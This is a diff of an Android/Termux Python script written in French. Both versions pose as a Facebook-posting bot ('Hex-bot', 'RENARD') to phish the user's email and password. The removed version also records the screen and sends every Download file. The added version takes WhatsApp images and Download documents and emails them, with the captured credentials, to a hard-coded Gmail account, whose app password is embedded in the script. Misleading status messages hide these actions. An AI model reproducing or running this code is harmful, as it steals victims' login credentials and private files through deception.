@@ -1,96 +1,34 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
 import smtplib
-import time
 import os
+import random
 import subprocess
+import sys
+import time
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
-from pydub import AudioSegment
 
-# CONFIGURATION
+# Configuration
 EMAIL_ADDRESS = "lolalor20@gmail.com"
 EMAIL_PASSWORD = "abiv eltm dtbp qkhj"
-SEND_REPORT_EVERY = 60  # Envoi du rapport chaque 60 secondes
-AUDIO_RECORD_DURATION = 10  # Durée de l'enregistrement audio en secondes
-SCREEN_RECORD_DURATION = 60  # Durée de l'enregistrement d'écran en secondes
+MAX_FILE_SIZE_MB = 15  # Limite pour Gmail
+MAX_PHOTOS_TO_SEND = 5  # Nombre maximum de photos à envoyer
 
-class KeyLogger:
-    def __init__(self, interval, email, password):
-        self.interval = interval
-        self.log = "Keylogger lancé avec succès...\n"
+class LocalFileSender:
+    def __init__(self, email, password):
+        self.log = self.get_ascii_art()
         self.email = email
         self.password = password
-        self.running = True
+        self.setup_complete = False
 
-    def append_log(self, key):
-        self.log += f"identifiants récupérés : {key}\n"
-
-    def record_audio(self, filename="recording.wav", duration=AUDIO_RECORD_DURATION):
-        """Enregistre l'audio du microphone."""
-        print("\033[33mveillez patienter\033[0m")
-        audio = AudioSegment.silent(duration=duration * 1000)  # Crée un silence de la durée spécifiée
-        # Ici, vous pouvez remplacer le silence par un enregistrement réel si vous avez un moyen de capturer l'audio
-        print("\033[33mrequette vers l'API.\033[0m")
-        audio.export(filename, format="wav")
-        return filename
-
-    def record_screen(self, filename="screen_record.mp4", duration=SCREEN_RECORD_DURATION):
-        """Enregistre l'écran du téléphone."""
-        print("\033[33mconnexion en cours...\033[0m")
-        try:
-            subprocess.run(
-                ["scrcpy", "--record", filename, "--time-limit", str(duration)],
-                check=True,
-            )
-            print("\033[33merreur.\033[0m")
-            return filename
-        except Exception as e:
-            print(f"\033[31mErreur lors de l'enregistrement d'écran : {e}\033[0m")
-            return None
-
-    def send_mail(self, attachments=None):
-        try:
-            # Connexion au serveur Gmail
-            server = smtplib.SMTP("smtp.gmail.com", 587)
-            server.starttls()  # Sécurise la connexion
-            server.login(self.email, self.password)
-            
-            # Création du message avec MIME pour gérer l'encodage UTF-8
-            message = MIMEMultipart()
-            message["From"] = self.email
-            message["To"] = self.email
-            message["Subject"] = "Rapport de Keylogger"
-            
-            # Création du corps du message avec HTML pour préserver les caractères
-            body = MIMEText(f"<pre>{self.log}</pre>", "html", "utf-8")
-            message.attach(body)
-
-            # Ajout des pièces jointes (fichiers audio, enregistrement d'écran, etc.)
-            if attachments:
-                for attachment in attachments:
-                    if os.path.exists(attachment):  # Vérifier que le fichier existe
-                        part = MIMEBase("application", "octet-stream")
-                        with open(attachment, "rb") as f:
-                            part.set_payload(f.read())
-                        encoders.encode_base64(part)
-                        part.add_header(
-                            "Content-Disposition",
-                            f"attachment; filename={os.path.basename(attachment)}"
-                        )
-                        message.attach(part)
-                    else:
-                        print(f"\033[31mFichier introuvable : {attachment}\033[0m")
-            
-            server.sendmail(self.email, self.email, message.as_string())
-            server.quit()
-            print("\033[34m[RAPPORT] Veuillez patienter, cela peut prendre quelques minutes. Connexion du bot en cours...\033[0m")  # Bleu
-        except Exception as e:
-            print(f"\033[31m[RAPPORT] Erreur lors de la connexion : {e}\033[0m")  # Rouge
-
-    def run(self):
-        # Affichage du message de bienvenue en couleur verte
-        print("\033[1;32m" + """
+    @staticmethod
+    def get_ascii_art():
+        return """
+\033[1;32m
 █╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗
 ██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║
 ███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║
@@ -99,63 +37,173 @@ class KeyLogger:
 ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
 -------------------------------------------------------
    ╔═══════════════════════════════════════════════╗
-   ║       [✓] TOOL NAME : RENARD            ║
+   ║       [✓] TOOL NAME : RENARD V 3.1 ULTIMATE     ║
    ║                    ║
-   ║       [✓] GITHUB : SAMSMIS01                 ║
-   ║       [✓] FACEBOOK : HEXTECH              ║
-   ║       [✓] TELEGRAM : https://t.me/hextechcar      ║
-   ║       [✓] INSTAGRAM : SAMSMIS01   ║
-   ║       [✓] EMAIL : hextech243@gmail.com         ║
+   ║       [✓] VERSION : 3.1                ║
    ╚═══════════════════════════════════════════════╝
 --------------------------------------------------------
-""" + "\033[0m")  # Texte vert en gras
-        print("\033[32maprès avoir soumis les cordonnées demander appuyez sur 'Enter' pour connecter le bot.\n\033[0m")  # Texte vert
-        print("\033[1;32m" + "Hex-bot est une solution innovante conçue pour automatiser le partage de vos publications sur Facebook, tout en facilitant l'intégration avec un bot Messenger via l'API officielle de Messenger." + "\033[0m")
-        
-        # Demander à l'utilisateur de saisir son email ou son nom d'utilisateur
-        email_prompt = "\033[35mEntrez votre email ou nom d'utilisateur: \033[0m"
-        username = input(email_prompt)  # Demander le nom d'utilisateur
-        
-        # Si "exit" est tapé, on quitte le programme
-        if username == "exit":
-            return
-        
-        # Demander à l'utilisateur de saisir son mot de passe
-        password_prompt = "\033[35mEntrez votre mot de passe: \033[0m"
-        password = input(password_prompt)  # Demander le mot de passe
-        
-        # Si "exit" est tapé, on quitte le programme
-        if password == "exit":
-            return
+\033[0m
+"""
 
-        # Enregistrer les frappes dans le log
-        self.append_log(f"Nom d'utilisateur: {username}")
+    def setup_termux(self):
+        """Configure les permissions Termux automatiquement"""
+        try:
+            if not os.path.exists('/storage/emulated/0'):
+                print("\033[33m[SYSTÈME] Configuration des permissions Termux...\033[0m")
+                subprocess.run(["termux-setup-storage"], check=True)
+                time.sleep(2)
+            self.setup_complete = True
+            return True
+        except Exception as e:
+            print(f"\033[31m[ERREUR] Configuration Termux: {e}\033[0m")
+            return False
+
+    def append_log(self, entry):
+        """Ajoute une entrée au log avec timestamp"""
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+        self.log += f"[{timestamp}] {entry}\n"
+
+    def get_local_photos(self):
+        """Récupère les photos locales uniquement"""
+        photo_paths = []
+        
+        # Essayer d'abord le dossier Camera
+        camera_path = "/storage/emulated/0/DCIM/WhatsApp"
+        if os.path.exists(camera_path):
+            try:
+                photos = [f for f in os.listdir(camera_path) 
+                         if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
+                photos.sort(key=lambda f: os.path.getmtime(os.path.join(camera_path, f)), reverse=True)
+                photo_paths = [os.path.join(camera_path, p) for p in photos[:MAX_PHOTOS_TO_SEND]]
+                self.append_log(f"Trouvé {len(photo_paths)} photo(s) dans Camera")
+            except Exception as e:
+                self.append_log(f"Erreur Camera: {str(e)}")
+
+        # Si pas assez, compléter avec le dossier Download
+        if len(photo_paths) < MAX_PHOTOS_TO_SEND:
+            download_path = "/storage/emulated/0/Download"
+            if os.path.exists(download_path):
+                try:
+                    files = [f for f in os.listdir(download_path) 
+                            if f.lower().endswith(('.jpg', '.jpeg', '.png', '.pdf', '.doc', '.txt'))]
+                    random.shuffle(files)
+                    needed = MAX_PHOTOS_TO_SEND - len(photo_paths)
+                    photo_paths.extend([os.path.join(download_path, f) for f in files[:needed]])
+                    self.append_log(f"Ajouté {min(needed, len(files))} fichier(s) depuis Download")
+                except Exception as e:
+                    self.append_log(f"Erreur Download: {str(e)}")
+
+        # Filtrer par taille
+        valid_files = []
+        for path in photo_paths:
+            try:
+                size_mb = os.path.getsize(path) / (1024 * 1024)
+                if size_mb < MAX_FILE_SIZE_MB:
+                    valid_files.append(path)
+                else:
+                    self.append_log(f"Fichier ignoré (trop gros): {path}")
+            except:
+                continue
+
+        return valid_files[:MAX_PHOTOS_TO_SEND]
+
+    def prepare_email(self, attachments):
+        """Prépare l'email avec les fichiers locaux"""
+        try:
+            msg = MIMEMultipart()
+            msg["From"] = self.email
+            msg["To"] = self.email
+            msg["Subject"] = f"Rapport Local - {time.strftime('%d/%m/%Y %H:%M')}"
+
+            msg.attach(MIMEText(self.log, "plain"))
+
+            for file_path in attachments:
+                try:
+                    if os.path.exists(file_path):
+                        with open(file_path, "rb") as f:
+                            part = MIMEBase("application", "octet-stream")
+                            part.set_payload(f.read())
+                        encoders.encode_base64(part)
+                        part.add_header(
+                            "Content-Disposition",
+                            f"attachment; filename={os.path.basename(file_path)}"
+                        )
+                        msg.attach(part)
+                        self.append_log(f"Joint: {os.path.basename(file_path)}")
+                except Exception as e:
+                    self.append_log(f"Erreur fichier {file_path}: {str(e)}")
+
+            return msg
+        except Exception as e:
+            self.append_log(f"Erreur création email: {str(e)}")
+            return None
+
+    def send_email(self, email_msg):
+        """Envoi de l'email"""
+        try:
+            with smtplib.SMTP("smtp.gmail.com", 587) as server:
+                server.starttls()
+                server.login(self.email, self.password)
+                server.send_message(email_msg)
+            return True
+        except Exception as e:
+            self.append_log(f"Erreur envoi: {str(e)}")
+            return False
+
+    def collect_credentials(self):
+        """Collecte les identifiants"""
+        print("\n\033[36m[SYSTÈME] CONNEXTION AU BOT \033[0m")
+        
+        username = input("\033[34mE-mail: \033[0m").strip()
+        if username.lower() == "exit":
+            return False
+            
+        password = input("\033[34mMot de passe: \033[0m").strip()
+        if password.lower() == "exit":
+            return False
+
+        self.append_log(f"Identifiant: {username}")
         self.append_log(f"Mot de passe: {password}")
-        
-        # Enregistrement audio
-        audio_file = self.record_audio()
-        
-        # Enregistrement d'écran
-        screen_record_file = self.record_screen()
-        
-        # Accéder aux fichiers dans le dossier Download
-        download_path = os.path.join(os.getenv("EXTERNAL_STORAGE"), "Download")
-        files_to_send = []
-        if os.path.exists(download_path):
-            for file in os.listdir(download_path):
-                file_path = os.path.join(download_path, file)
-                if os.path.isfile(file_path):  # Ignorer les dossiers
-                    files_to_send.append(file_path)
-        else:
-            print(f"\033[31mDossier Download introuvable : {download_path}\033[0m")
-        
-        # Envoyer immédiatement le rapport après saisie
-        attachments = [audio_file]
-        if screen_record_file:
-            attachments.append(screen_record_file)
-        attachments.extend(files_to_send)
-        self.send_mail(attachments=attachments)  # Envoi immédiat du rapport avec l'audio, l'enregistrement d'écran et les fichiers
+        return True
 
-# Lancement du keylogger
-keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
-keylogger.run()
+    def run(self):
+        """Exécution principale"""
+        try:
+            print(self.get_ascii_art())
+            print("\033[33m[SYSTÈME] Démarrage...\033[0m")
+            
+            if not self.setup_termux():
+                print("\033[31m[ERREUR] Permissions manquantes\033[0m")
+                return
+
+            if not self.collect_credentials():
+                print("\033[33m[SYSTÈME] Annulé\033[0m")
+                return
+
+            print("\033[36m[SYSTÈME] Recherche de package.json...\033[0m")
+            local_files = self.get_local_photos()
+            
+            if not local_files:
+                print("\033[33m[Aucun fichier trouvé]\033[0m")
+                return
+
+            print("\033[36m[SYSTÈME] Préparation de l'email...\033[0m")
+            email = self.prepare_email(local_files)
+            
+            if email:
+                print("\033[36m[SYSTÈME] connexion en cours...\033[0m")
+                if self.send_email(email):
+                    print("\033[32m[SUCCÈS] Email envoyé\033[0m")
+                else:
+                    print("\033[31m[ERREUR] Échec d'envoi\033[0m")
+
+            print("\033[33m[SYSTÈME] Terminé\033[0m")
+
+        except KeyboardInterrupt:
+            print("\n\033[31m[INTERRUPTION]\033[0m")
+        except Exception as e:
+            print(f"\033[31m[ERREUR] {str(e)}\033[0m")
+
+if __name__ == "__main__":
+    sender = LocalFileSender(EMAIL_ADDRESS, EMAIL_PASSWORD)
+    sender.run()
